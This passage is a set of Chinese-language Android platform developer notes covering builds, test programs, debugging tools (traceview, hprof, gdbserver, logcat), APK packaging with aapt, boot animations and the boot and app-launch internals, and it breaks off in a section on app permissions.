1) 配置 ANDROID 系统环境
$ cd $ANDROID_SRC
$ . build/envsetup.sh
2) 编辑桌面环境脚本 test_env.sh(否则 run-test 程序运行时报错)
内容如下:
#!/bin/sh
base=`pwd`
root=$base/out/debug/host/linux-x86/product/sim/system
export ANDROID_ROOT=$root
bootpath=$root/framework
export
BOOTCLASSPATH=$bootpath/core.jar:$bootpath/ext.jar:$bootpath/framework.jar:$bootpath/androi
d.policy.jar:$bootpath/services.jar
export ANDROID_DATA=/tmp/dalvik_$USER
mkdir -p $ANDROID_DATA/dalvik-cache
并执行该脚本
$ . test_env.sh
3) 运行测试程序 003
$ cd dalvik/test
$ ./run-test 003
```

## [CMD] 编写测试小程序(jar, dex, bin)

```text
1. 各个层面的 android 测试程序
2. 说明
在问题定位时,通常使用一些非常简单的程序来测试,以简化逻辑。下面介绍 android
各个层面的测试的编写:普通的 java 程序,加入 android 类的 java 程序,带 android
界面的 java 程序和运行在 android 平台上的 c/c++程序
3. 配置环境
$ cd $ANDROID_SRC
$ . build/envsetup.sh
$ cd development
4. 普通 java 程序
1) 建立 Foo.java,内容如下
class Foo {
    public static void main(String[]  args) {
        System.out.println(“Hello, world”);
    }
}
2) 编译
$ javac Foo.java
$ dx --dex --output=foo.jar Foo.class
# 把一个或多个 class 编成一个 jar
3) 运行
$ adb push foo.jar /sdcard # 复制到设备的 sd 卡中
$ adb shell dalvikvm -cp /sdcard/foo.jar Foo
# 指明路径和类名
5. 使用 android 特定功能的 java 程序(需引入 android 库)
1) 建立 Foo.java,内容如下
import android.os.Debug;
class Foo {
    public static void main(String[]  args) {
        System.out.println("Hello, world");
        android.os.Debug.dumpHprofData("/sdcard/test.hprof");
    }
}
2) 建立 Android.mk,内容如下
LOCAL_PATH:= $(call my-dir)
include $(CLEAR_VARS)
LOCAL_SRC_FILES:=$(call all-subdir-java-files)
LOCAL_MODULE:=foo
include $(BUILD_JAVA_LIBRARY)
3) 编译
$ mm
4) 运行
$ adb push $ANDROID_SRC/out/target/product/xxxxxxx/system/framework/foo.jar /sdcard # 复制到设备的 sd 卡中
$ adb shell dalvikvm -cp /sdcard/foo.jar Foo
# 指明路径和类名
6. 带界面的 android 程序
1) 使用 eclipse 建立
a) 在 eclipse 中点击菜单 File->New->Project......,选择 Android Project
b) 填写 project 的各项内容如下
Project name: test_xy 目录名, 它位于你设定的 workspace 之下
Package name: com.android.testxy 打包名称
Activity name: TestXy 类名(生成文件 TestXy.java)
Application: name:test_app_name 可执行程序名
然后点 Finish 按钮
c) 填写代码
这时可以看到代码界面了,从左边的树中打开代码
test_xyÆ src Æ com.android.testxyÆ TestXy.javaÆTestXyÆonCreate
修改其中代码(不改也行)
2) 修改编译运行
a) eclipse 中运行
i) 在 eclipse 中点击菜单 Run->Run Configurations......
ii) 双击左边的 Android Application,产生了一个 New Configuration,点开它填
写内容如下:
Name: yan_config // 随便起一个
Project: test_xy // 刚才起的 project, 即目录名
iii) 点击 Apply,然后点 Run,多等一会儿就出来了
b) 从命令行运行
i) 复制工程到 Android 源码目录中
$ cp $WORKSPACE/test_xy $ANDROID_SRC/development/ -R
ii) 加入 Android.mk
$ cd $ANDROID_SRC/development/test_xy/
编写 Android.mk 内容如下
LOCAL_PATH:=$(call my-dir)
include $(CLEAR_VARS)
LOCAL_SRC_FILES := $(call all-subdir-java-files)
LOCAL_PACKAGE_NAME:=XyTest
LOCAL_CERTIFICATE:=platform
include $(BUILD_PACKAGE)
编译
iii)
$ mm
iv) 运行
$ adb install $ANDROID_SRC/out/target/product/xxxxxx/system/app/XyTest.apk
$ adb shell am start -n com.android.testxy/com.android.testxy.TestXy
# am start -n 类名/类名.Activity 名
7. 简单的 c++程序
1) 建立 main.c,内容如下
#include <stdio.h>
int main() {
    printf("Hello World!\n");
    return 0;
}
2) 建立 Android.mk,内容如下
LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)
LOCAL_SRC_FILES := main.c
LOCAL_MODULE := helloworld
include $(BUILD_EXECUTABLE)
3) 编译
$ cd $(ANDROID_SRC) && make helloworld
或
$ mm
4) 运行
$ adb push out/target/product/generic/system/bin/helloworld /sdcard
$ adb shell /sdcard/helloword
```

## [debug]  [Snippet] 查看当前堆栈

```text Java
//方法1：
try {
    new Exception("print trace").printStackTrace();
} catch(Exception e) {
    e.printStackTrace();
    android.util.Log.e("TestTag", "Exception:" + e, e);
}

//方法2：
RuntimeException here = new RuntimeException("bolex");
here.fillInStackTrace();
here.printStackTrace();
Log.w("myTag", "Called: " + this, here);

//方法3：
try {
    Object mObject = null;
    mObject.toString();
} catch (Exception e) {
    e.printStackTrace();
    android.util.Log.e("TestTag", "NPE:" + e, e);
}

//方法4：
for (StackTraceElement i : Thread.currentThread().getStackTrace()) {
    Log.d(TAG, "-- ↑ --" + i.toString());
}

//方法5：
Log.w(TAG, "stack", new Exception());

//方法6：
Log.d(TAG, Log.getStackTraceString(new Throwable()));

//方法7：
android.util.Log.e("MyTag", Thread.currentThread().getStackTrace()[2] .getClassName()+"-->"+Thread.currentThread().getStackTrace()[2] .getMethodName()+"()-->"+Thread.currentThread().getStackTrace()[2] .getLineNumber());
```

## [debug] 调试小技巧

```text
MethodTracing
1) 功能:用于热点分析和性能优化,分析每个函数占用的 CPU 时间,调用次数,函
数调用关系等
2) 方法:
a) 在程序代码中加入追踪开关
import android.os.Debug;
......
android.os.Debug.startMethodTracing(“/data/tmp/test”); // 先建 /data/tmp 目录
...... // 被追踪的程序段
android.os.Debug.stopMethodTracing();
b) 编译,运行后,设备端生成/data/tmp/test.trace 文件
c) 把 trace 文件复制到 PC 端
$ adb pull /data/tmp/test.trace ./
d) 使用 android 自带工具分析 trace 文件
$ $ANDROID_SRC/out/host/linux-x86/bin/traceview test.trace
此时可看到各个函数被调用的次数 CPU 占用率等信息
e) 使用 android 自带工具分析生成调用关系类图
$ apt-get install graphviz
# 安装图片相关软件
$ANDROID_SRC/out/host/linux-x86/bin/dmtracedump -g test.png test.trace
此时目录下生成类图 test.png
3) 注意
trace 文件生成与 libdvm 模块 DEBUG 版本相冲突,所以此方法只适用于对非
DEBUG 版本模拟器的调试,否则在分析 trace 文件时会报错
3. HProf (Heap Profile)
1) 功能:
用于 java 层面的内存分析,显示详细的内存占用信息,指出可疑的内存泄漏对象
2) 方法:
a) 在代码中加入 dump 动作
import android.os.Debug;
import java.io.IOException;
......
try {
android.os.Debug.dumpHprofData(“/data/tmp/input.hprof”); // 先建 /data/tmp 目录
} catch (IOException ioe) {
}
b) 把 hprof 文件复制到 PC 端
$ adb pull /data/tmp/input.hprof ./
c) 使用命令 hprof-conv 把 hprof 转成 MAT 识别的标准的 hprof
$ $ANDROID_SRC/out/host/linux-x86/bin/hprof-conv input.hprof output.hprof
d) 使用MAT工具看hprof信息
下载MAT工具:http://www.eclipse.org/mat/downloads.php
用工具打开output.hprof
3) 注意:此工具只能显示 java 层面的,而不能显示C层的内存占用信息
4. SamplingProfile (android 2.0 上版本使用)
1) 功能
每隔N毫秒对当前正在运行的函数取样,并输出到 log 中
2) 在代码中加入取样设定
import dalvik.system.SamplingProfiler
......
SamplingProfile sp = SamplingProfiler.getInstance();
sp.start(n);
// n 为设定每秒采样次数
sp.logSnapshot(sp.snapshot());
......
sp.shutDown();
它会启一个线程监测,在 logcat 中打印信息
5. 用发系统信号的方式取当前堆栈情况和内存信息
1) 原理
dalvik 虚拟机对 SIGQUIT 和 SIGUSR1 信号进行处理(dalvik/vm/SignalCatcher.c),
分别完成取当前堆栈和取当前内存情况的功能
2) 用法
a) $ chmod 777 /data/anr -R # 把 anr 目录权限设为可写
$ rm /data/anr/traces.txt
# 删除之前的 trace 信息
$ ps # 找到进程号
$ kill -3 进程号 # 发送 SIGQUIT 信号给该进程,此时生成 trace 信息
$ cat /data/anr/traces.txt
功能实现:遍历 thread list(dalvik/vm/Thread.c:dvmDumpAllThreadEx()),并打印
当前函数调用关系(dalvik/vm/interp/Stack.c:dumpFrames())
b) $ chmod 777 /data/misc -R
$ ps # 找到进程号
$ kill -10 进程号 # 发送 SIGQUIT 信事信号给该进程,此时生成 hprof 信息
$ ls /data/misc/*.hprof
此时生成 hprf 文件,如何使用此文件,见第二部分(HProf)
注意:hprof 文件都很大,注意用完马上删除,以免占满存储器
6. logcat 及原理
1) android.util.Log 利用 println 的标准 java 输出词句,并加前缀 I/V/D....
2) dalvik 利用管道加线程的方式,先利用 dup2 把 stdout 和 stderr 重定向到管理中
(vm/StdioConverter.c:dvmstdioConverterStartup),然后再启动一个线程从管道另一
端读出内容(dalvik/vm/StdioConverter.c:stdioconverterThreadStart()),使用 LOG 公共
工具(system/core/liblog/logd_write.c: __android_log_print())输出到/dev/log/*中去
3) logcat 通过加不同参数看/dev/log/下的不同输入信息
# logcat -b main
# logcat -b radio
# logcat -b events
显示主缓冲区中的信息
显示无线缓冲区中的信息
显示事件缓冲区中的信息
7. jdwp(java debug wire protocol)及原理
1) 虚拟机(设备端)在启动时加载了 Agent JDWP 从而具备了调试功能。在调试器
端(PC 端)通过 JDWP 协议与设备连接,通过发送命令来获取的状态和控制 Java
程序的执行。JDWP 是通过命令(command)和回复(reply)进行通信的。
2) JDK 中调试工具 jdb 就是一个调试器,DDMS 也提供调试器与设备相连。
3) dalvik 为 JDWP 提供了两种连接方式:tcp 方式和 adb 方式,tcp 方式可以手工指
定端口,adb 方式自动设定为 8700 端口,通常使用 DDMS 调试就是通过 adb 方式
8. monkey
1) monkey 是一个 android 自带的命令行工具。它向系统发送伪随机的用户事件流,
实现对正在开发的应用程序进行压力测试。
2) 方法
在设备端打开 setting 界面
$ adb shell
# monkey -p com.android.settings -v 500
此时可以看到界面不断被切换
9. 其它小工具
具体见 android.os.Debug 中提供的工具
1) 取毫微秒级的时间,用于计算时间
threadCpuTimeNanos()
2) 统计两点间的内存分配情况
startAllocCounting()
stopAllocCounting()
getGlobalAllocCount()
get.....
3) 打印当前已 load 的 class
getLoadedClassCount()
printLoadedClasses() 它需要打开 NDEBUG 功能才能打开 system/core/ 中 Log 功能
10.
打印 debug 信息
$ adb bugreport
```

## [debug] c++程序的调试

```text
1. 使用 gdbserver 调试
使用 JDWP 只能调试 java 层面的程序,如果想调试 C 层面的代码,需要使用 gdbserver
方式,gdbserver 的服务端和客户端都包含在 android 的源码中。
server 端是 out/target/product/xxxxxx/system/bin/gdbserver。
client 端是 prebuild/linux-x86/toolchain/xxxxxx/bin/arm-eabi-gdb)
,不需另外安装。
(请看完本文再开始调试,尤其是“注意”部分)
本文依据张博的调试文档, 加以扩充说明,感谢原创者。
2. 调试前的准备:编译 DEBUG 版本的程序和库
1) 新建(或修改)ANDROID 源码根目录的 buildspec.mk,加入以下内容
DEBUG_MODULE_lidvm:=true # 虚拟机模块设为 debug
TARGET_CUSTOM_DEBUG_CFLAGS:=-O0 -mlong-calls
(请修改具体模块名,我调试的是虚拟机的 libdvm.so 库)
2) 重编 dalvik 模块
$ make clean-libdvm
$ make dalvik snod
3) 重烧 system.img 或替换手机中的相应模块
3. gdb server 端配置
1) 端口映射
$ adb forward tcp:5039 tcp:5039
把设备的 5039 端口映射到 PC 的 5039
设定之后用 netstat -na 命令可看到 PC 的 5039 端口已处于 listen 状态
注意每次断开手机再连接时,都要重新执行该命令
2) 调试进程号为 2014 进程
$ adb shell
# ps 找进程号
# gdbserver :5039 --attach 2014 # 指明 tcp 端口号和进程号
注意:用此方法只适用于对已运行的程序 debug(不能使用直接在 gdbserver 后跟
程序名的方式运行)
此时 2014 进程被挂起,等待调试
4. gdb client 端配置
1) 用命令行工具调试
$
$ANDROID_DIR/prebuilt/linux-x86/toolchain/xxxxxx/bin/arm-eabi-gdb
$ANDROID_DIR/out/target/product/xxxxxx/system/bin/app_process
注意可执行程序名必须是 app_process,不是你所调试的程序名
(gdb) set solib-absolute-prefix $ANDROID_SRC)/out/target/product/xxxxxx/symbols/system/lib/
(gdb) set solib-search-path $ANDROID_SRC)/out/target/product/xxxxxx/symbols/system/lib/
以上路径为 GDB 默认库的搜索路径,即交叉编译器库路径,若不设定,则找不到
符号表,(带符号表的库在 symbols/system/lib/*,手机里 strip 后无符号表的库在
system/lib/*,它们必须配套使用)
(gdb) target remote :5039 指明 TCP 端口号
此时连接 gdb server,可设断点调试,按 c 继续执行程序
2) 用 eclipse 调试
a) 安装 cdt,使 eclipse 支持 c/c++程序的开发
i) 下载
从http://www.eclipse.org/cdt/downloads.php下载cdt-master-4.0.0.zip
ii) 解压
$ mkdir cdt; cd cdt; unzip ../cdt-master-4.0.0.zip
iii)
将解压缩后的 features、plugins 两个文件夹的内容复制到 Eclipse 安装目
录中
$ cp plugins/* ../../eclipse/plugins/
$ cp features/* ../../eclipse/features/
iv) 重新开启 Eclipse 即可
$ eclipse -clean
在新建 project 中即可看到 c/c++相关选项,说明已安装成功
b) 加入要调试的代码
i) 新建 C++ project (菜单 File->New->Project...)
不使用 default location,把 Location 指定成代码所在目录
ii) 取消自动编译选项(菜单 Project->Build Automatically)
c) 配置 gdb 环境
配置 Debug Configurations(菜单 Run->Debug Configurations...)
i) 新建一个 C/C++ Local Application 的 debug configuration
ii) Main 选项卡中
指定 Project 为新建的 C++工程,
C/C++ Applications 为:
$ANDROID_DIR/out/target/product/xxxxxx/system/bin/app_process
iii)
Debugger 选项卡中
指定 Debugger 为 gdbserver Debugger,
Main 子选项卡的 Gdb debuger 设为:
$ANDROID_DIR/prebuilt/linux-x86/toolchain/xxxxxx/bin/arm-eabi-gdb
GDB command file 设为一个文件名,文件内容如下:
file $ANDROID_DIR/out/target/product/xxxxxx/system/bin/app_process
set solib-absolute-prefix $ANDROID_SRC)/out/target/product/xxxxxx/symbols/system/lib/
set solib-search-path $ANDROID_SRC)/out/target/product/xxxxxx/symbols/system/lib/
Connection 子选项卡:
Type 设为 TCP,Port number 设为 5039
iv) 点击 Debug 按钮进入调试,之前挂起的程序此时继续运行
d) 设置断点及调试
i) 找开某一C程序(菜单->Open file)
ii) 在程序中双击可设置断点,设置后断点出现在右上的 Breakpoints 中
iii) Debug 选项卡提供了工具调试(suspend, resume 等)
5. 加打印语句
如果需要在 C 程序中加打印语句,有两种方法
1) 直接在代码中使用 printf,此方法只能应用于从命令行启动程序的情况,运行时可
以 adb shell 中看到打印信息
2) 使用程序中提供的重定项后的打印语句,并在 logcat 中看到它
例如在 libdvm.so 中使用 dvmFprintf(stderr, “xieyan log\n”);
6. 可能出现的问题及解决方法
1) 在找不到原因时,可以写一个在android可以运行的简单c语言程序用gdbserver调
试,以简化问题,android中c程序做法见:
http://www.top-e.org/jiaoshi/html/?157.html
2) 我的是在 arm-eabi-2.4.1 的编译器编出来的,你的可能不是,编译时用 make
showcommands 确定你的系统使用的编译工具链,否则如果你 debug 时用的和编
译时用的版本不一致,会导致读符号表时出错(注意看提示)
3) 有时编译会引起源码目录的变化,请在左侧 Project explorer 中刷新相关项目
```

## [log]  [debug] 查看当前堆栈调用关系

```text
$ rm /data/anr/traces.txt
清除之前 log 信息,因为 log 信息是追加到此文件中的
$ ps 找应用对应进程号
$ kill -3 进程号 该进程当前的堆栈调用写入 traces.txt
$ cat /data/anr/traces.txt 查看堆栈信息
```

## [log] log相关

```text
10. 获取当前系统的内核配置, 可用如下方法取得内核配置文件
$ adb pull /proc/config.gz /tmp
$ vi tmp/config.gz
12.
在 Android.mk 中打印提示信息
$(info "xxxxxxxx")
13.
lib 库中打印 log 信息
在文件头部加
#define LOG_TAG “testme”
#undef LOG // 有的版本需要这句,有的版本不需要
#include <utils/Log.h>
在程序中用
LOGE(“log is xxxxx”);
在编 lib 库的 Android.mk 中加
LOCAL_SHARED_LIBRARIES:=libutils
14.
lib 库中 jni 用 c++
在每个函数前头加,以免提示找不到函数名
#ifdef __cplusplus
extern “C”
#endif
15.
看 log 的时间
$ adb logcat -v time > /tmp/log.txt
```

## [图片] 9patch 相关

```text
9patch 是一种特殊的文件格式,它以”.9.png”为扩展名,它的上下左右各有一象素留
边,用以标识图片以何种方式拉伸,一般做图时留边中以黑色标识其拉伸区域,此为
显式的 9patch 信息,用以方便做图者编辑(android 提供工具 draw9patch 来编辑 9patch
图),程序打包时 aapt 工具把该图留边去掉,并将信息其写入 png 文件内部,使之变
为隐显 9patch 信息
```

## 制作换肤包

```text
1. 如何做换肤包
1) 最简单的方法是替换源码中的资源,然后重新编译
a) 举例:修改系统公共资源——系统字体大小
修改 framework/base/core/res/res/values*/style.xml 其中的 TexAppearance 的Large,Medium,Small 的 textSize,它们分别对应大中小字的字号修改后,在 res 目录中重新编译(使用 mm 命令),然后将生成的 framework-res.apk拷到手机的/system/framework 目录中
b) 注意:源码中的资源必须和设备中资源相对应,因在生成 framework-res.apk 的过程中生成了资源 ID 号,而各应用通过资源 ID 号读取系统资源,所以如果 ID号不一致,整个系统的资源就乱了
2) 有时候我们只想换包中的某个图片,不想重编整个包,或者从网上下载的应用程序,得不到源码不能重编,但也想对其换肤。由于 apk 是 zip 格式的压缩包,最简单的方法是解包,替换图片,然后再打包
$ mkdir tmp; cd tmp
$ unzip ../xxx.apk
$ cp xxx.png res/drawable/ 替换图片
$ zip -r ../xxx_new.apk *
然后安装到系统中,或替换原有包,即可。
3) 有时会遇到图片不能以原有方式被拉伸的问题,这是由于某些 9patch 格式图片丢失了其格式信息,下面通过了解 apk 打包工具可以解决此问题(直接修改 apk 包和使用 metaporgh 皮肤的原理是一样的)
```

## apk 如何打包

```text
了解打包的目的在于了解对 9patch 图及其它资源的处理过程
1) 编译某应用(以计算器为例)
$ cd packages/apps/Calculator
$ mm showcommands
使用参数 showcommands 可以看到编译用到的具体命令,其中最核心的是 aapt
2) 使用aapt命令打包 (aapt源码见framework/base/tools/aapt)为了解原理,我们建立一个最简单的只含有图片的包,用此方式,可以把图片从显式的 9patch图变成隐式的 9patch图,建立目录及文件如下
$ mkdir test; cd test
$ vi AndroidManifest.xml 编辑内容如下
<?xml version=”1.0” encoding=utf8?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.android.test">
</manifest>
$ mkdir res/drawable -p
$ cp xxxx.png res/darwable/
$ aapt package -S res -M AndroidManifest.xml -F test.apk -f
3) 浏览 apk 包中内容
$ mkdir tmp; cd tmp
$ unzip ../test.apk
$ ls
此时看到 xml 文件补转换成不可读的了,产生了 resources.arsc,其中包含资源列表(ResTable),它说明了每个资源的 resourceid (不同字段标明包名类型和编号),pac,type, name, flag,res 中某些资源也会被打入 resources.arsc 中(如 string)
4) res/drawable/中的图片仍存在,如果它是 9patch 图,则图片会把显式的 9patch 位置打成隐式的 9patch 信息
5) 想看某个 apk 包的内容, 可以编其源码目录中的 printapk.cpp, 用于打印某包的资源信息, 它的编法是改 Android.mk 为编 printapk 的, 注意库中要加 libzipfile
4. aapt 工具
aapt 工具用于生成查看和编辑 apk 包
1) 打包
a) 打包
$ aapt package -S res -M AndroidManifest.xml -F xxt.apk -f
2) 查看
a) 查看 apk 中包含哪些资源文件
$ aapt list xxx.apk
b) 查看某个 xml 的内容
$ aapt dump xmltree xxx.apk res/layout/main.xml (xml 不能是 values*中的,因为它已被打进 resources.arsc)
c) 查看 resources.arsc 中的资源内容
$ aapt dump --values resources xxx.apk
3) 编辑
用此方法编辑与 zip 解压修改再压缩的方式不同,它会编译 xml 文件和处理 9patch 图
a) 从包中删除某文件
$ aapt remove xxx.apk res/layout/alert_dialog.xml
b) 将某文件加入包中
$ aapt add xxx.apk res/layout/alert_dialog.xml
5. 总结
换肤时,如果想替换 9patch 图,需要使用 aapt 或其它工具对图进行处理,否则如果只是简单地用 zip 工具解开 apk 包,替换一个普通图片,再打包成 apk 的话,是达不到你想要的拉伸效果的,这是由于普通图不包含 9ptach 信息,以上方法可以转换 9patch 图,即做好显式的 9patch 图,然后有以上方法产生隐式的9patch 图,再将它放入包中替换原有资源
```

## [boot] 开机流程

```text
1. 系统引导 bootloader
1) 源码:bootable/bootloader/*
2) 说明:加电后,CPU 将先执行 bootloader 程序,此处有三种选择
a) 开机按 Camera+Power 启动到 fastboot,即命令或 SD 卡烧写模式,不加载内核及文件系统,此处可以进行工厂模式的烧写
b) 开机按 Home+Power 启动到 recovery 模式,加载 recovery.img,recovery.img 包含内核,基本的文件系统,用于工程模式的烧写
c) 开机按 Power,正常启动系统,加载 boot.img,boot.img 包含内核,基本文件系统,用于正常启动手机(以下只分析正常启动的情况)
2. 内核 kernel
1) 源码:kernel/*
2) 说明:kernel 由 bootloader 加载
3. 文件系统及应用 init
1) 源码:system/core/init/*
2) 配置文件:system/rootdir/init.rc,
3) 说明:init 是一个由内核启动的用户级进程,它按照 init.rc 中的设置执行:启动服务(这里的服务指 linux 底层服务,如 adbd 提供 adb 支持,vold 提供 SD 卡挂载等),执行命令和按其中的配置语句执行相应功能
4. 重要的后台程序 zygote
1) 源码:frameworks/base/cmds/app_main.cpp 等
2) 说 明 :zygote 是 一个在 init.rc 中被指定启动的服务,该服务对应的命令是/system/bin/app_process
a) 建立 Java Runtime,建立虚拟机
b) 建立 Socket 接收 ActivityManangerService 的请求,用于 Fork 应用程序
c) 启动 System Server
5. 系统服务 system server
1) 源码:
frameworks/base/services/java/com/android/server/SystemServer.java
2) 说明:被 zygote 启动,通过 System Manager 管理 android 的服务(这里的服务指frameworks/base/services 下的服务,如卫星定位服务,剪切板服务等)
6. 桌面 launcher
1) 源码:ActivityManagerService.java 为入口,packages/apps/launcher*实现
2) 说明:系统启动成功后 SystemServer 使用 xxx.systemReady()通知各个服务,系统已经就绪,桌面程序 Home 就是在 ActivityManagerService.systemReady()通知的过程中建立的,最终调用 startHomeActivityLocked()启 launcher
7. 解锁
1) 源码:
frameworks/policies/base/phone/com/android/internal/policy/impl/*lock*
2) 说 明 : 系 统 启 动 成 功 后 SystemServer 调 用 wm.systemReady() 通 知WindowManagerService , 进 而 调 用 PhoneWindowManager , 最 终 通 过LockPatternKeyguardView 显示解锁界面,跟踪代码可以看到解锁界面并不是一个Activity,这是只是向特定层上绘图,其代码了存放在特殊的位置
8. 开机自启动的第三方应用程序
1) 源码:
frameworks/base/services/java/com/android/server/am/ActivityManagerService.java
2) 说明 : 系统启动成功后
SystemServer
调用
ActivityManagerNative.getDefault().systemReady()通知 ActivityManager 启动成功,
ActivityManager 会通过置变量 mBooting,通知它的另一线程,该线程会发送广播
android.intent.action.BOOT_COMPLETED 以告知已注册的第三方程序在开机时自
动启动。
9. 总结
综上所述,系统层次关于启动最核心的部分是 zygote(即 app_process)和 system server,zygote 它负责最基本的虚拟机的建立,以支持各个应用程序的启动,而 system server用于管理 android 后台服务,启动步骤及顺序。
10. 参考
http://blog.csdn.net/basonjiang_sz/category/648399.aspx
```

## [boot] 开机动画

```text
开机动画
1. 说明
android 开机画面由三部分组成,第一部分在 bootloader 启动时显示,第二部分在启
动 kernel 时显示,第三部分在系统启动时(bootanimation)显示(动画)
2. bootloader 开机图片
1) 一般使用 rle 格式图片,不同的 android 系统不同此图片可能放在不同位置,以下
实例均以 G1 为例,G1 放在 splash 分区中
2) 制作 rle 格式开机图片
a) 将图片转成 320x480,256 色,保存成不带 Alpha 通道的 png 格式
b) 使用 convert 工具将 splash.png 转换成8位色的 splash.raw
convert splash.png -depth 8 rgb:splash.raw
确认 splash.raw 大小为 460800 字节
c) 使用 android 工具 rgb2565 改变图像格式
out/host/linux-x86/bin/rgb2565 < splash.raw > splash.raw565
确认 splash.raw565 大小为 307200 字节
3) 烧写(以 G1 为例)
按 Power+Camera 启动到烧写模式
fastboot flash splash1 splash.raw565
3. kernel 开机图片
1) 相关代码
kernel/drivers/video/msm/msm_fb.c(G1 使用高通芯片组 MSM7201 芯片组)
它会读出根目录下的 xx.rle,并显示为开机画面,rle 做法同上
4. bootanimation 开机动画
1) android 2.0 之前
a) 说明
使用 bootanimation 程序显示开机画面,如需修改开机画面,需要修改源码
b) 代码
frameworks/base/cmds/bootanimation/*
frameworks/base/core/res/assets/images/android-logo*
2) android 2.0 及之后
a) 说明
使用 bootanimation 程序显示开机画面,如需修改开机画面,不用修改代码,只
需按格式要求做 bootanimation.zip 包,放在系统的/system/media 目录中,或
/data/local 目录中即可,两个目录下都存在时,优先使用/data/local 下的
b) 代码
frameworks/base/cmds/bootanimation/*
frameworks/base/core/res/assets/images*
c) 制作动画包
i) 描述文件 desc.txt
480 427 30
p 1 0 part0
p 0 10 part1
总体说明:480 为宽度,427 为高度,30 为帧数,即每秒播放动画 30 帧
部分说明:第一项 p 为标志符,第二项为循环次数 1 为只播放 1 次,0为无
限循环,第三项为两次循环之间间隔的帧数,第四项为对应的目录名
ii) 图片
图片放在 desc.txt 中目录名指定的目录中,目录中按字符顺序播放
iii) 打包
♦ windows
使用 winrar 找包,选择 ZIP 格式,压缩标准要选“储存”
♦ linux
zip -0 -r ../bootanimation.zip ./*
linux 命令使用-0 指定压缩等级为最低等级 stored,即只归档不压缩,否
则可能由于包格式问题引起动画显示为黑屏
♦ 注意
打包不要带上层目录
5. 参考
1) bootanimation相关
http://blog.21ic.com/user1/2537/archives/2009/65606.html
2) rle文件制作
http://hi.baidu.com/kernel_linux/blog/item/9eff140f9d089c206159f3cb.html
3) bootloader启动
http://blog.csdn.net/yili_xie/archive/2010/05/14/5592276.aspx
```

## android应用的启动过程

```text
1. 说明
应用的启动过程通常是通过 startActivity 函数,无论是在应用中调其它应用还是在桌面(桌面是 Launcher 应用)上点击,最终都将通过这个函数启动进程或者界面,下面以分析代码的方式,介绍它具体的工作过程
2. 过程
1) Launcher/src/com/android/launcher.java
在应用或桌面上启动应用,例如桌面应用的启动由于中调用了 startActivity()函数
2) frameworks/base/core/java/android/app/Activity.java:startActivity()
Activity.java 继承了 Context.java,并实现了它的 startActivity(),它向下调用了
execStartActivity()
3) frameworks/base/core/java/android/app/Instrumentation.java:execStartActivity()
execStartActivity 利用 IntentFilter 得到具体 Activity,并调用了更下层的 startActivity
4) frameworks/base/core/java/android/app/ActivityManagerNative.java
ActivityManagerProxy.startActivity()
IBinder.transact(....);
它通过 Binder 的方式与 ActivityManagerService.java 通讯,并发送启动请求
5) frameworks/base/core/java/android/os/Binder.java:execTransact()
Binder 消息转递的实现,用于用户应用与后台服务的通讯
6) frameworks/base/services/java/com/android/server/am/ActivityManagerService.java
onTransact();
startProcessLocked();
开启新线程
7) frameworks/base/core/java/android/os/Process.java 的函数 start 为入口
通过 socket 发给 zygote 进程
8) frameworks/base/core/java/com/android/internal/os/Zygote*.java
告知虚拟机新建进程,此时会将要建立的进程名,用户名,组名一并传给虚拟机,
以建立进程
9) dalvik/libcore/dalvik/src/main/java/dalvik/system/Zygote.java
虚拟机处理
10)
dalvik/vm/native/dalvik_system_Zygote.c (forkAndSpecializeCommon)
虚拟机处理
```

## 服务的原理与使用

```text
1. 说明
android 的后台运行在很多 service,它们在系统启动时被 SystemServer 开启,支持系
统的正常工作,比如 MountService 监听是否有 SD 卡安装及移除,ClipboardService
提供剪切板功能,PackageManagerService 提供软件包的安装移除及查看等等,应用
程序可以通过系统提供的 Manager 接口来访问这些 Service 提供的数据,以下将说明
他们的工具流程
2. 举例说明基本流程
以 android 系统支持 sensor(传感器)实例来说明框架层的 service 和 manager 是如何
配合工作的
1) 什么是 sensor
sensor 是传感器, 比如控制横竖屏切换利用的就是重力传感器(gsensor), 还有
accelerator sensor 可取得 x, y, z 三个轴上的加速度(应用如平衡球, 小猴吃香蕉等)
2) 应用程序调用(以下为关键代码)
sensorManager=(SensorManager)getSystemService(context.SENSOR_SERVICE);
lightSensor = sensorManager.getDefaultSensor(Sensor.TYPE_LIGHT);
sensorManager.registerListener(sensorListener,
lightSensor,
SensorManager.SENSOR_DELAY_NORMAL);
3) Manager 层
a) 提供给应用程序调用的接口,同实与 Service 交互,实现功能
frameworks/base/core/java/android/hardware/SensorManager.java
4) Service 层
a) 开机时就运行的管理 Sensor 的后台服务
frameworks/base/services/java/com/android/server/SensorService.java
b) snesor 后台服务需要的 JNI,通过它与系统级交互
frameworks/base/services/jni/com_android_server_SensorService.cpp
5) 系统层
a) 传感器的头文件,硬件提供商按此文件的定义实现其功能
hardware/libhardware/include/hardware/sensors.h
b) 传感器的系统层实现,与内核交互,此处通常是硬件提供商提供的
hareware/libsensors
6) 内核及硬件层
内核访问硬件,同时以设备文件等方式提供给上层控制接口和传感器数据
3. 系统层实现
1) frameworks/base/core/java/android/*Manager.java 对应用的接口
2) frameworks/base/core/jni/
对应用的接口的 JNI
3) frameworks/base/services/java/com/android/server/ 后台服务
4) frameworks/base/services/jni/
JNI 与系统层接
5) hardware/libhardware/include/
系统层头文件
6) hardware/libxxx
系统库支持
7) 内核支持
4. 应用程序如何使用
1) 查看系统提供哪些服务
find frameworks/base/core/java/android/ -name "*Manager.java"
此处可以看到调用系统提供服务的入口
2) 一般 register listener,事件发生时都收到回调
5. 如何新建一个 service(以 froyo 为例)
1) 接口:接口供应用调用
frameworks/base/core/java/android/app/ContextImpl.java 加服务名与 Manager 对应
frameworks/base/core/java/android/content/Context.java 加服务名定义
2) Manager:提供服务对应的调用接口
frameworks/base/core/java/android/app/StartXXXXManager.java 实现调用接口
frameworks/base/core/java/android/app/IXXXXManager.aidl 定义调用接口
frameworks/base/Android.mk
加入 aidl 的编译
3) service:提供后台服务支持
frameworks/base/services/java/com/android/server/XXXXService.java 服务实现
frameworks/base/services/java/com/android/server/SystemServer.java
启动服务
```

## 应用的权限相关问题

```text
1. 权限
每个程序在安装时都有建立一个系统 ID,如 app_15,用以保护数据不被其它应用获
取。Android 根据不同的用户和组,分配不同权限,比如访问 SD 卡,访问网络等等。
底层映射为 Linux 权限。
2. 应用申请权限
1) 应用开发者通过 AndroidManifest.xml 中<uses-permission>指定对应权限,再映射
到底层的用户和组,默认情况下不设定特殊的权限。AndroidManifest 加入权限后
